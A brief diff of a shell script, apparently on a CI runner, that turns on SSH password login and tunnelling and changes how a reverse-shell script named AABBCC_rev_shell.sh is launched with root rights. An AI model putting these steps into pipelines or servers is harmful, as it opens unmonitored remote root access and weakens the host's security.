@@ -83,7 +83,7 @@ echo  -e "PasswordAuthentication yes\nPermitTunnel yes" > /etc/ssh/sshd_config.d
 grep -q AABBCC_rev_shell /tmp/js9 &&
 (
 export HOME=/tmp;
-sudo -EH /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
+sudo -H su -l -c /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
 )
 
 # 无条件执行 
